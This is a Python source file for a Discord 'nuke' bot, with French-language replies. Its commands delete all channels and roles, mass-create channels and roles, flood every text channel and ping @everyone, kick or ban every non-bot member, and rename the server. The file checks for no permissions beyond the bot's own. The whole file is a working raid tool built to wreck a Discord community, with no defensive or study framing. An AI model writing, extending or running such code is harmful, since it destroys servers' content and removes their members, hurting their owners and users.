import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.all()

bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f"c'est bon tu peux faire mumuse avec {bot.user.name}")

@bot.command()
async def phelp(ctx):
    await ctx.send("il n'y a pas de message d'aide, débrouille toi.")

@bot.command()
async def purgenuke(ctx):
    if ctx.guild:
        for channel in ctx.guild.channels:
            await channel.delete()
    else:
        await ctx.send("kestufou")

@bot.command()
async def spamsalon(ctx, name, count: int):
    if ctx.guild:
        for _ in range(count):
            await ctx.guild.create_text_channel(name)
        await ctx.send(f"{count} salon avec comme nom '{name}' ont été créé.")
    else:
        await ctx.send("KESTUFOU")

@bot.command()
async def spam(ctx, content, count: int):
    if ctx.guild:
        for channel in ctx.guild.text_channels:
            if channel.permissions_for(ctx.guild.me).send_messages:
                for _ in range(count):
                    await channel.send(content)
        await ctx.send(f"spam fini.")
    else:
        await ctx.send("TU FAIS QUOI ?!")
        
@bot.command()
async def kickall(ctx, *, reason):
    if ctx.guild:
        for member in ctx.guild.members:
            if not member.bot:
                try:
                    await member.kick(reason=reason)
                except discord.Forbidden:
                    pass
        await ctx.send(f"Toutes les personnes qui pouvait être kick l'ont été")
    else:
        await ctx.send("TU FAIS QUOI ?!?!")
        
@bot.command()
async def banall(ctx, *, reason):
    if ctx.guild:
        for member in ctx.guild.members:
            if not member.bot:
                try:
                    await member.ban(reason=reason, delete_message_days=7)
                except discord.Forbidden:
                    pass
        await ctx.send(f"Y'A PLUS PERSONNE")
    else:
        await ctx.send("ALORS LA SOIS TES CON SOIS CHUI UNE MERDE")

@bot.command()
async def nom(ctx, *, new_name):
    if ctx.guild:
        await ctx.guild.edit(name=new_name)
        await ctx.send(f"Nom changé.")
    else:
        await ctx.send("Flemme de faire un message d'erreur.")

@bot.command()
async def nuke(ctx, channel_name, count: int):
    if ctx.guild:
        for channel in ctx.guild.channels:
            await channel.delete()

        for role in ctx.guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except discord.Forbidden:
                    pass
                except discord.HTTPException:
                    pass

        for _ in range(count):
            new_channel = await ctx.guild.create_text_channel(channel_name)
            await new_channel.send("@everyone")
            
        await ctx.send(f"Nuke par {ctx.author.name}.")
    else:
        await ctx.send("la y'a une putain d'erreur zbi.")

@bot.command()
async def spamrole(ctx, role_name, count: int):
    if ctx.guild:
        for _ in range(count):
            await ctx.guild.create_role(name=role_name)
        await ctx.send(f"{count} rôles avec comme nom '{role_name}' ont été créé.")
    else:
        await ctx.send("EH Y'A UNE ERREUR JE CROIS HEIN.")

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    await bot.process_commands(message)

def main():
    token = input("Bot Token: ").strip()
    bot.run(token)

if __name__ == "__main__":
    main()
